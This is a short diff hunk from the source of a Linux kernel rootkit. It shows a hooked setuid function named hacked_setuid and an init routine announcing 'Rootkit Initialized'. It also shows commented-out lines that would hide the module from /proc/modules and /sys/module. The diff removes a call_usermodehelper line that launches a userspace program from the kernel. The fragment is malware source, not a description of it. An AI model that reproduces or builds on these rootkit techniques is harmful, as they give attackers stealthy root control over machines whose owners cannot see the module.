@@ -202,8 +202,6 @@ asmlinkage int hacked_setuid(uid_t uid){
 int rootkit_init(void) { // Start lel rootkit
 	printk("Rootkit Initialized\n");
 
-	call_usermodehelper(argv[0], argv, env, UMH_NO_WAIT);
-
 	//list_del_init(&__this_module.list); // Remove module from /proc/modules
 	//kobject_del(&THIS_MODULE->mkobj.kobj); // Remove module from /sys/module
 
